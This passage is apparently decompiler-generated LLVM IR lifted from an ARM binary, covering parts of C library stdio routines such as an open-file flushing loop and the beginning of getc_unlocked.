  br i1 %v0_153c4, label %dec_label_pc_153c8, label %dec_label_pc_153b4.dec_label_pc_153a8_crit_edge

dec_label_pc_153b4.dec_label_pc_153a8_crit_edge:  ; preds = %dec_label_pc_153b4
  %v0_153a8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_153ac.pre = load i32, i32* @r4, align 4
  %v1_153a8 = inttoptr i32 %v0_153a8.pre to i32*
  %v2_153a8 = load i32, i32* %v1_153a8, align 4
  store i32 %v2_153a8, i32* %r3.global-to-local, align 4
  %v3_153ac = icmp uge i32 %v2_153a8, %v1_153ac.pre
  store i1 %v3_153ac, i1* %cpsr_c.global-to-local, align 1
  %v9_153ac = icmp eq i32 %v2_153a8, %v1_153ac.pre
  br i1 %v9_153ac, label %dec_label_pc_153b4, label %dec_label_pc_153cc

dec_label_pc_153c8:                               ; preds = %dec_label_pc_153b4
  %v0_153c8 = load i32, i32* @r4, align 4
  store i32 %v0_153c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_153cc

dec_label_pc_153cc:                               ; preds = %dec_label_pc_1539c, %dec_label_pc_153b4.dec_label_pc_153a8_crit_edge, %dec_label_pc_153c8
  %v0_153d4 = phi i32 [ %v0_153c8, %dec_label_pc_153c8 ], [ %v2_153a8111, %dec_label_pc_1539c ], [ %v2_153a8, %dec_label_pc_153b4.dec_label_pc_153a8_crit_edge ]
  %v1_153cc = phi i32 [ %v0_153c8, %dec_label_pc_153c8 ], [ %v2_1539c, %dec_label_pc_1539c ], [ %v1_153ac.pre, %dec_label_pc_153b4.dec_label_pc_153a8_crit_edge ]
  %v3_153cc = icmp uge i32 %v0_153d4, %v1_153cc
  store i1 %v3_153cc, i1* %cpsr_c.global-to-local, align 1
  %v9_153cc = icmp eq i32 %v0_153d4, %v1_153cc
  br i1 %v9_153cc, label %dec_label_pc_153d4, label %dec_label_pc_153cc.dec_label_pc_1539c_crit_edge

dec_label_pc_153cc.dec_label_pc_1539c_crit_edge:  ; preds = %dec_label_pc_153cc
  %v0_1539c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1539c

dec_label_pc_153d4:                               ; preds = %dec_label_pc_153cc
  %v2_153d4 = icmp ne i32 %v1_153cc, 0
  store i1 %v2_153d4, i1* %cpsr_c.global-to-local, align 1
  %v7_153d8 = icmp slt i32 %v1_153cc, 2
  br i1 %v7_153d8, label %dec_label_pc_153f4thread-pre-split, label %dec_label_pc_153dc

dec_label_pc_153dc:                               ; preds = %dec_label_pc_153d4
  %v0_153dc = load i32, i32* @r7, align 4
  store i32 %v0_153dc, i32* %r0.global-to-local, align 4
  %v0_153e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_153e0 = add i32 %v0_153e0, 129
  store i32 %v1_153e0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_153f4thread-pre-split

dec_label_pc_153f4thread-pre-split:               ; preds = %dec_label_pc_153d4, %dec_label_pc_153dc
  %v0_15540.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_153f4

dec_label_pc_153f4:                               ; preds = %dec_label_pc_153f4thread-pre-split, %dec_label_pc_15374
  %v0_15540.pr = phi i32 [ %v0_15540.pr.pr, %dec_label_pc_153f4thread-pre-split ], [ %v2_1538c, %dec_label_pc_15374 ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1554018 = icmp eq i32 %v0_15540.pr, 0
  br i1 %v2_1554018, label %dec_label_pc_15548, label %dec_label_pc_15404

dec_label_pc_15404:                               ; preds = %dec_label_pc_153f4, %dec_label_pc_1553c
  %v0_1542c = phi i32 [ %v3_1553c, %dec_label_pc_1553c ], [ %v0_15540.pr, %dec_label_pc_153f4 ]
  %v1_15404 = inttoptr i32 %v0_1542c to i16*
  %v2_15404 = load i16, i16* %v1_15404, align 2
  %v3_15404 = zext i16 %v2_15404 to i32
  store i32 %v3_15404, i32* %r3.global-to-local, align 4
  %v1_15408 = and i32 %v3_15404, 64
  %v2_15408 = icmp eq i32 %v1_15408, 0
  br i1 %v2_15408, label %dec_label_pc_1553c, label %dec_label_pc_15410

dec_label_pc_15410:                               ; preds = %dec_label_pc_15404
  %v0_15410 = load i32, i32* @r6, align 4
  %v1_15410 = load i32, i32* %sb.global-to-local, align 4
  %v2_15410 = add i32 %v1_15410, %v0_15410
  %v3_15410 = inttoptr i32 %v2_15410 to i32*
  %v4_15410 = load i32, i32* %v3_15410, align 4
  store i32 %v4_15410, i32* %r3.global-to-local, align 4
  %v1_15414 = inttoptr i32 %v4_15410 to i32*
  %v2_15414 = load i32, i32* %v1_15414, align 4
  store i32 %v2_15414, i32* %r3.global-to-local, align 4
  %v2_15418 = icmp ugt i32 %v2_15414, 1
  store i1 %v2_15418, i1* %cpsr_c.global-to-local, align 1
  %v7_15418 = icmp eq i32 %v2_15414, 2
  br i1 %v7_15418, label %dec_label_pc_1547c, label %dec_label_pc_15420

dec_label_pc_15420:                               ; preds = %dec_label_pc_15410
  %v1_15420 = add i32 %v0_1542c, 64
  %v2_15420 = inttoptr i32 %v1_15420 to i32*
  %v3_15420 = load i32, i32* %v2_15420, align 4
  store i32 %v3_15420, i32* %r3.global-to-local, align 4
  %v1_15424 = load i32, i32* %r8.global-to-local, align 4
  %v3_15424 = icmp uge i32 %v3_15420, %v1_15424
  store i1 %v3_15424, i1* %cpsr_c.global-to-local, align 1
  %v9_15424 = icmp eq i32 %v3_15420, %v1_15424
  br i1 %v9_15424, label %dec_label_pc_15470, label %dec_label_pc_1542c

dec_label_pc_1542c:                               ; preds = %dec_label_pc_15420
  %v1_1542c = add i32 %v0_1542c, 56
  store i32 %v1_1542c, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_1542c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1543c86 = inttoptr i32 %v1_1542c to i32*
  %v2_1543c87 = load i32, i32* %v1_1543c86, align 4
  store i32 %v2_1543c87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1544094 = icmp eq i32 %v2_1543c87, 0
  br i1 %v9_1544094, label %dec_label_pc_15448, label %dec_label_pc_15460

dec_label_pc_15448:                               ; preds = %dec_label_pc_1542c, %dec_label_pc_15448.dec_label_pc_1543c_crit_edge
  %v0_1544895 = phi i32 [ %v1_15440.pre, %dec_label_pc_15448.dec_label_pc_1543c_crit_edge ], [ 0, %dec_label_pc_1542c ]
  store i32 %v0_1544895, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15458 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15458, label %dec_label_pc_1545c, label %dec_label_pc_15448.dec_label_pc_1543c_crit_edge

dec_label_pc_15448.dec_label_pc_1543c_crit_edge:  ; preds = %dec_label_pc_15448
  %v0_1543c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15440.pre = load i32, i32* @r4, align 4
  %v1_1543c = inttoptr i32 %v0_1543c.pre to i32*
  %v2_1543c = load i32, i32* %v1_1543c, align 4
  store i32 %v2_1543c, i32* %r3.global-to-local, align 4
  %v3_15440 = icmp uge i32 %v2_1543c, %v1_15440.pre
  store i1 %v3_15440, i1* %cpsr_c.global-to-local, align 1
  %v9_15440 = icmp eq i32 %v2_1543c, %v1_15440.pre
  br i1 %v9_15440, label %dec_label_pc_15448, label %dec_label_pc_15460

dec_label_pc_1545c:                               ; preds = %dec_label_pc_15448
  %v0_1545c = load i32, i32* @r4, align 4
  store i32 %v0_1545c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15460

dec_label_pc_15460:                               ; preds = %dec_label_pc_1542c, %dec_label_pc_15448.dec_label_pc_1543c_crit_edge, %dec_label_pc_1545c
  %v0_15460 = phi i32 [ %v0_1545c, %dec_label_pc_1545c ], [ %v2_1543c87, %dec_label_pc_1542c ], [ %v2_1543c, %dec_label_pc_15448.dec_label_pc_1543c_crit_edge ]
  %v1_15460 = phi i32 [ %v0_1545c, %dec_label_pc_1545c ], [ 0, %dec_label_pc_1542c ], [ %v1_15440.pre, %dec_label_pc_15448.dec_label_pc_1543c_crit_edge ]
  %v3_15460 = icmp uge i32 %v0_15460, %v1_15460
  store i1 %v3_15460, i1* %cpsr_c.global-to-local, align 1
  %v9_15460 = icmp eq i32 %v0_15460, %v1_15460
  br i1 %v9_15460, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_15460
  %v1_15464 = load i32, i32* @r7, align 4
  store i32 %v1_15464, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_15460, %bb69
  %v1_15468 = xor i1 %v9_15460, true
  call void @__pseudo_cond_branch(i1 %v1_15468, i32 ptrtoint (i32* @global_var_12a80.726 to i32))
  %v0_1546c = load i32, i32* %r8.global-to-local, align 4
  %v1_1546c = load i32, i32* @r5, align 4
  %v2_1546c = add i32 %v1_1546c, 64
  %v3_1546c = inttoptr i32 %v2_1546c to i32*
  store i32 %v0_1546c, i32* %v3_1546c, align 4
  %v0_15470.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15470

dec_label_pc_15470:                               ; preds = %dec_label_pc_15420, %bb70
  %v0_15470 = phi i32 [ %v0_1542c, %dec_label_pc_15420 ], [ %v0_15470.pre, %bb70 ]
  %v1_15470 = add i32 %v0_15470, 60
  %v2_15470 = inttoptr i32 %v1_15470 to i32*
  %v3_15470 = load i32, i32* %v2_15470, align 4
  %v1_15474 = add i32 %v3_15470, 1
  store i32 %v1_15474, i32* %r3.global-to-local, align 4
  store i32 %v1_15474, i32* %v2_15470, align 4
  %v0_1547c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1547c

dec_label_pc_1547c:                               ; preds = %dec_label_pc_15410, %dec_label_pc_15470
  %v0_15494 = phi i32 [ %v0_1542c, %dec_label_pc_15410 ], [ %v0_1547c.pre, %dec_label_pc_15470 ]
  %v1_1547c = inttoptr i32 %v0_15494 to i16*
  %v2_1547c = load i16, i16* %v1_1547c, align 2
  %v3_1547c = zext i16 %v2_1547c to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_15484 = or i32 %v3_1547c, %stack_var_-44.1
  %v1_15488 = xor i32 %v2_15484, 320
  store i32 %v1_15488, i32* %r3.global-to-local, align 4
  %v1_1548c = and i32 %v1_15488, 832
  %v2_1548c = icmp eq i32 %v1_1548c, 0
  br i1 %v2_1548c, label %dec_label_pc_15494, label %bb71

dec_label_pc_15494:                               ; preds = %dec_label_pc_1547c
  store i32 %v0_15494, i32* %r0.global-to-local, align 4
  %v1_15498 = call i32 @__stdio_wcommit(i32 %v0_15494)
  store i32 %v1_15498, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1549c = icmp eq i32 %v1_15498, 0
  br i1 %v2_1549c, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_15494
  %v1_154a0 = load i32, i32* @r5, align 4
  %v2_154a0 = inttoptr i32 %v1_154a0 to i16*
  %v3_154a0 = load i16, i16* %v2_154a0, align 2
  %v4_154a0 = zext i16 %v3_154a0 to i32
  store i32 %v4_154a0, i32* %r3.global-to-local, align 4
  %v2_154a4 = add i32 %v1_154a0, 8
  %v3_154a4 = inttoptr i32 %v2_154a4 to i32*
  %v4_154a4 = load i32, i32* %v3_154a4, align 4
  store i32 %v4_154a4, i32* %r2.global-to-local, align 4
  %v2_154a8 = and i32 %v4_154a0, 65471
  store i32 %v2_154a8, i32* %r3.global-to-local, align 4
  %v3_154ac = add i32 %v1_154a0, 28
  %v4_154ac = inttoptr i32 %v3_154ac to i32*
  store i32 %v4_154a4, i32* %v4_154ac, align 4
  %v1_154b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_154b0 = trunc i32 %v1_154b0 to i16
  %v3_154b0 = load i32, i32* @r5, align 4
  %v4_154b0 = inttoptr i32 %v3_154b0 to i16*
  store i16 %v2_154b0, i16* %v4_154b0, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_15494
  %v1_154b4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_154b4, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_1547c, %.thread7
  %v0_154b8 = load i32, i32* @r6, align 4
  %v1_154b8 = load i32, i32* %sb.global-to-local, align 4
  %v2_154b8 = add i32 %v1_154b8, %v0_154b8
  %v3_154b8 = inttoptr i32 %v2_154b8 to i32*
  %v4_154b8 = load i32, i32* %v3_154b8, align 4
  store i32 %v4_154b8, i32* %r3.global-to-local, align 4
  %v1_154bc = inttoptr i32 %v4_154b8 to i32*
  %v2_154bc = load i32, i32* %v1_154bc, align 4
  store i32 %v2_154bc, i32* %r3.global-to-local, align 4
  %v2_154c0 = icmp ugt i32 %v2_154bc, 1
  store i1 %v2_154c0, i1* %cpsr_c.global-to-local, align 1
  %v7_154c0 = icmp eq i32 %v2_154bc, 2
  br i1 %v7_154c0, label %dec_label_pc_1553c, label %dec_label_pc_154c8

dec_label_pc_154c8:                               ; preds = %bb71
  %v0_154c8 = load i32, i32* @r5, align 4
  %v1_154c8 = add i32 %v0_154c8, 60
  %v2_154c8 = inttoptr i32 %v1_154c8 to i32*
  %v3_154c8 = load i32, i32* %v2_154c8, align 4
  %v1_154cc = add i32 %v3_154c8, -1
  store i32 %v1_154cc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_154d0 = icmp eq i32 %v1_154cc, 0
  store i32 %v1_154cc, i32* %v2_154c8, align 4
  br i1 %v2_154d0, label %dec_label_pc_154dc, label %dec_label_pc_1553c

dec_label_pc_154dc:                               ; preds = %dec_label_pc_154c8
  %v0_154dc = load i32, i32* %r3.global-to-local, align 4
  %v1_154dc = load i32, i32* @r5, align 4
  %v2_154dc = add i32 %v1_154dc, 64
  %v3_154dc = inttoptr i32 %v2_154dc to i32*
  store i32 %v0_154dc, i32* %v3_154dc, align 4
  %v0_154e0 = load i32, i32* @r5, align 4
  %v1_154e0 = add i32 %v0_154e0, 56
  store i32 %v1_154e0, i32* @r7, align 4
  br label %dec_label_pc_154e4

dec_label_pc_154e4:                               ; preds = %dec_label_pc_15514.dec_label_pc_154e4_crit_edge, %dec_label_pc_154dc
  %v0_154ec = phi i32 [ %v0_154ec.pre, %dec_label_pc_15514.dec_label_pc_154e4_crit_edge ], [ %v1_154e0, %dec_label_pc_154dc ]
  %v0_154e4 = phi i32 [ %v0_154e4.pre, %dec_label_pc_15514.dec_label_pc_154e4_crit_edge ], [ %v0_154e0, %dec_label_pc_154dc ]
  %v1_154e4 = add i32 %v0_154e4, 56
  %v2_154e4 = inttoptr i32 %v1_154e4 to i32*
  %v3_154e4 = load i32, i32* %v2_154e4, align 4
  store i32 %v3_154e4, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_154ec, i32* %r2.global-to-local, align 4
  %v1_154f097 = inttoptr i32 %v0_154ec to i32*
  %v2_154f098 = load i32, i32* %v1_154f097, align 4
  store i32 %v2_154f098, i32* %r3.global-to-local, align 4
  %v3_154f4100 = icmp uge i32 %v2_154f098, %v3_154e4
  store i1 %v3_154f4100, i1* %cpsr_c.global-to-local, align 1
  %v9_154f4106 = icmp eq i32 %v2_154f098, %v3_154e4
  br i1 %v9_154f4106, label %dec_label_pc_154fc, label %dec_label_pc_15514

dec_label_pc_154fc:                               ; preds = %dec_label_pc_154e4, %dec_label_pc_154fc.dec_label_pc_154f0_crit_edge
  %v0_154fc107 = phi i32 [ %v1_154f4.pre, %dec_label_pc_154fc.dec_label_pc_154f0_crit_edge ], [ %v3_154e4, %dec_label_pc_154e4 ]
  store i32 %v0_154fc107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1550c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1550c, label %dec_label_pc_15510, label %dec_label_pc_154fc.dec_label_pc_154f0_crit_edge

dec_label_pc_154fc.dec_label_pc_154f0_crit_edge:  ; preds = %dec_label_pc_154fc
  %v0_154f0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_154f4.pre = load i32, i32* @r4, align 4
  %v1_154f0 = inttoptr i32 %v0_154f0.pre to i32*
  %v2_154f0 = load i32, i32* %v1_154f0, align 4
  store i32 %v2_154f0, i32* %r3.global-to-local, align 4
  %v3_154f4 = icmp uge i32 %v2_154f0, %v1_154f4.pre
  store i1 %v3_154f4, i1* %cpsr_c.global-to-local, align 1
  %v9_154f4 = icmp eq i32 %v2_154f0, %v1_154f4.pre
  br i1 %v9_154f4, label %dec_label_pc_154fc, label %dec_label_pc_15514

dec_label_pc_15510:                               ; preds = %dec_label_pc_154fc
  %v0_15510 = load i32, i32* @r4, align 4
  store i32 %v0_15510, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15514

dec_label_pc_15514:                               ; preds = %dec_label_pc_154e4, %dec_label_pc_154fc.dec_label_pc_154f0_crit_edge, %dec_label_pc_15510
  %v0_1551c = phi i32 [ %v0_15510, %dec_label_pc_15510 ], [ %v2_154f098, %dec_label_pc_154e4 ], [ %v2_154f0, %dec_label_pc_154fc.dec_label_pc_154f0_crit_edge ]
  %v1_15514 = phi i32 [ %v0_15510, %dec_label_pc_15510 ], [ %v3_154e4, %dec_label_pc_154e4 ], [ %v1_154f4.pre, %dec_label_pc_154fc.dec_label_pc_154f0_crit_edge ]
  %v3_15514 = icmp uge i32 %v0_1551c, %v1_15514
  store i1 %v3_15514, i1* %cpsr_c.global-to-local, align 1
  %v9_15514 = icmp eq i32 %v0_1551c, %v1_15514
  br i1 %v9_15514, label %dec_label_pc_1551c, label %dec_label_pc_15514.dec_label_pc_154e4_crit_edge

dec_label_pc_15514.dec_label_pc_154e4_crit_edge:  ; preds = %dec_label_pc_15514
  %v0_154e4.pre = load i32, i32* @r5, align 4
  %v0_154ec.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_154e4

dec_label_pc_1551c:                               ; preds = %dec_label_pc_15514
  %v2_1551c = icmp ne i32 %v1_15514, 0
  store i1 %v2_1551c, i1* %cpsr_c.global-to-local, align 1
  %v7_15520 = icmp slt i32 %v1_15514, 2
  br i1 %v7_15520, label %dec_label_pc_1553c, label %dec_label_pc_15524

dec_label_pc_15524:                               ; preds = %dec_label_pc_1551c
  %v0_15524 = load i32, i32* @r5, align 4
  %v1_15524 = add i32 %v0_15524, 56
  store i32 %v1_15524, i32* %r0.global-to-local, align 4
  %v0_15528 = load i32, i32* %r1.global-to-local, align 4
  %v1_15528 = add i32 %v0_15528, 129
  store i32 %v1_15528, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1553c

dec_label_pc_1553c:                               ; preds = %dec_label_pc_154c8, %dec_label_pc_15524, %dec_label_pc_1551c, %bb71, %dec_label_pc_15404
  %v0_1553c = load i32, i32* @r5, align 4
  %v1_1553c = add i32 %v0_1553c, 32
  %v2_1553c = inttoptr i32 %v1_1553c to i32*
  %v3_1553c = load i32, i32* %v2_1553c, align 4
  store i32 %v3_1553c, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15540 = icmp eq i32 %v3_1553c, 0
  br i1 %v2_15540, label %dec_label_pc_15548, label %dec_label_pc_15404

dec_label_pc_15548:                               ; preds = %dec_label_pc_1553c, %dec_label_pc_153f4
  %v0_15548 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_15548, i32* %r0.global-to-local, align 4
  %v0_15584.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_15550:                               ; preds = %dec_label_pc_1522c
  %v3_15550 = load i16, i16* %arg1, align 2
  %v4_15550 = zext i16 %v3_15550 to i32
  %v1_15554 = and i32 %v4_15550, 64
  store i32 %v1_15554, i32* %r3.global-to-local, align 4
  %v2_15554 = icmp eq i32 %v1_15554, 0
  br i1 %v2_15554, label %bb72, label %dec_label_pc_15560

bb72:                                             ; preds = %dec_label_pc_15550
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_15560:                               ; preds = %dec_label_pc_15550
  %v2_15560 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_15560, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15564 = icmp eq i32 %v2_15560, 0
  br i1 %v2_15564, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_15560
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_15560
  %v1_15568 = load i32, i32* @r4, align 4
  %v2_15568 = inttoptr i32 %v1_15568 to i16*
  %v3_15568 = load i16, i16* %v2_15568, align 2
  %v4_15568 = zext i16 %v3_15568 to i32
  store i32 %v4_15568, i32* %r3.global-to-local, align 4
  %v2_1556c = add i32 %v1_15568, 8
  %v3_1556c = inttoptr i32 %v2_1556c to i32*
  %v4_1556c = load i32, i32* %v3_1556c, align 4
  store i32 %v4_1556c, i32* %r2.global-to-local, align 4
  %v2_15570 = and i32 %v4_15568, 65471
  store i32 %v2_15570, i32* %r3.global-to-local, align 4
  %v2_15574 = trunc i32 %v2_15570 to i16
  store i16 %v2_15574, i16* %v2_15568, align 2
  %v1_15578 = load i32, i32* %r2.global-to-local, align 4
  %v2_15578 = load i32, i32* @r4, align 4
  %v3_15578 = add i32 %v2_15578, 28
  %v4_15578 = inttoptr i32 %v3_15578 to i32*
  store i32 %v1_15578, i32* %v4_15578, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_15548, %.thread14
  %v0_15584 = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_15584.pre, %dec_label_pc_15548 ], [ 0, %.thread14 ]
  store i32 %v0_15584, i32* %r0.global-to-local, align 4
  store i32 %v6_15200, i32* %r5.global-to-local, align 4
  ret i32 %v0_15584

; uselistorder directives
  uselistorder i32 %v0_15584, { 1, 0 }
  uselistorder i32 %v3_1553c, { 1, 2, 0 }
  uselistorder i32 %v0_15510, { 1, 0, 2 }
  uselistorder i32 %v1_154f4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15494, { 1, 0, 2 }
  uselistorder i32 %v0_1545c, { 1, 0, 2 }
  uselistorder i32 %v1_15440.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_15424, { 1, 0 }
  uselistorder i32 %v0_153c8, { 1, 0, 2 }
  uselistorder i32 %v1_153ac.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1539c, { 1, 0 }
  uselistorder i32 %v0_15360, { 1, 0, 2 }
  uselistorder i32 %v1_15344.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1532c, { 1, 0 }
  uselistorder i32 %v0_152f4, { 1, 0, 2 }
  uselistorder i32 %v1_152d8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_152c8, { 1, 0 }
  uselistorder i32 %v0_15284, { 1, 0, 2 }
  uselistorder i32 %v1_15268.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_15240, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 51, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 50, 19, 20, 21, 22, 23, 24, 26, 25, 52, 27, 28, 29, 30, 32, 31, 53, 33, 34, 35, 36, 38, 37, 54, 39, 40, 41, 42, 44, 43, 55, 45, 46, 49, 47, 48 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 11, 1, 2, 3, 31, 32, 4, 5, 6, 7, 8, 29, 30, 9, 10, 28, 12, 13, 14, 33, 34, 15, 16, 17, 35, 36, 18, 19, 20, 21, 37, 38, 22, 23, 24, 39, 40, 25, 26, 27 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 31, 26, 27, 28, 29, 30 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1553c, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_15514, { 2, 1, 0 }
  uselistorder label %dec_label_pc_154fc, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1547c, { 1, 0 }
  uselistorder label %dec_label_pc_15470, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_15460, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15448, { 1, 0 }
  uselistorder label %dec_label_pc_15404, { 1, 0 }
  uselistorder label %dec_label_pc_153f4thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_153cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_153b4, { 1, 0 }
  uselistorder label %dec_label_pc_15374, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_15364, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1534c, { 1, 0 }
  uselistorder label %dec_label_pc_15320, { 1, 2, 0 }
  uselistorder label %dec_label_pc_152f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_152e0, { 1, 0 }
  uselistorder label %dec_label_pc_15298, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_15288, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15270, { 1, 0 }
  uselistorder label %dec_label_pc_1523c, { 1, 0 }
}

define i32 @function_15598(i32 %arg1) local_unnamed_addr {
dec_label_pc_15598:
  %v0_15598 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15598, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_15598
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15598, %bb
  %v10_155a8 = phi i32 [ %arg1, %dec_label_pc_15598 ], [ 0, %bb ]
  ret i32 %v10_155a8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_155ac = load i32, i32* @r4, align 4
  store i32 %v3_155ac, i32* %stack_var_-12, align 4
  %v6_155ac = load i32, i32* @r5, align 4
  %v9_155ac = load i32, i32* @lr, align 4
  %v0_155b0 = load i32, i32* @r0, align 4
  %v1_155b0 = add i32 %v0_155b0, 16
  %v2_155b0 = inttoptr i32 %v1_155b0 to i32*
  %v3_155b0 = load i32, i32* %v2_155b0, align 4
  store i32 %v3_155b0, i32* %r2.global-to-local, align 4
  %v1_155b4 = add i32 %v0_155b0, 24
  %v2_155b4 = inttoptr i32 %v1_155b4 to i32*
  %v3_155b4 = load i32, i32* %v2_155b4, align 4
  %v3_155b8 = icmp ult i32 %v3_155b0, %v3_155b4
  store i32 %v0_155b0, i32* @r4, align 4
  br i1 %v3_155b8, label %bb, label %dec_label_pc_155d8

bb:                                               ; preds = %entry
  %v2_155c4 = inttoptr i32 %v3_155b0 to i8*
  %v3_155c4 = load i8, i8* %v2_155c4, align 1
  %v4_155c4 = zext i8 %v3_155c4 to i32
  store i32 %v4_155c4, i32* %r0.global-to-local, align 4
  %v6_155c4 = add i32 %v3_155b0, 1
  store i32 %v6_155c4, i32* %r2.global-to-local, align 4
  store i32 %v6_155c4, i32* %v2_155b0, align 4
  br label %dec_label_pc_156c4

dec_label_pc_155d8:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r5, align 4
  %v1_155d8 = inttoptr i32 %v0_155b0 to i16*
  %v2_155d8 = load i16, i16* %v1_155d8, align 2
  %v3_155d8 = zext i16 %v2_155d8 to i32
  %v1_155dc = and i32 %v3_155d8, 131
  %tmp25 = icmp ugt i32 %v1_155dc, 128
  br i1 %tmp25, label %dec_label_pc_155f8, label %dec_label_pc_155e8

dec_label_pc_155e8:                               ; preds = %dec_label_pc_155d8
